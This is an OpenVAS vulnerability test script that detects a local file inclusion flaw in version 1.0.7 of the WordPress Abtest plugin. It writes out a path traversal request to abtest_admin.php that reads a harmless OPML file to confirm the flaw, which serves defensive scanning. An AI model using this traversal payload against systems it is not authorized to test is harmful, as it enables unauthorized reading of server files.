###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_abtest_dir_trav_vuln.nasl 5101 2017-01-25 11:40:28Z antu123 $
#
# Wordpress Abtest Local File Inclusion Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807641");
  script_version("$Revision: 5101 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-01-25 12:40:28 +0100 (Wed, 25 Jan 2017) $");
  script_tag(name:"creation_date", value:"2016-04-12 18:40:45 +0530 (Tue, 12 Apr 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Wordpress Abtest Local File Inclusion Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  Abtest plugin and is prone to local file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read php files.");

  script_tag(name:"insight", value:"The flaws exist due to improper
  sanitization of 'action' parameter in 'abtest_admin.php' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.

  Impact Level: Application");

  script_tag(name:"affected", value:"Wordpress Abtest plugin version 1.0.7");

  script_tag(name:"solution", value:"No solution or patch is available as of
  24th January, 2017. Information regarding this issue will be addressed once the
  updates are available. 
  For updates refer to https://wordpress.org/plugins/tags/abtest");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/39577/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
url = "";
http_port = 0;

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Vulnerable URL
url = dir + '/wp-content/plugins/abtest-master/abtest_admin.php?action=../../../../wp-links-opml';

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:'opml version="[0-9.]+"',
   extra_check:make_list("WordPress", "</opml>")))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
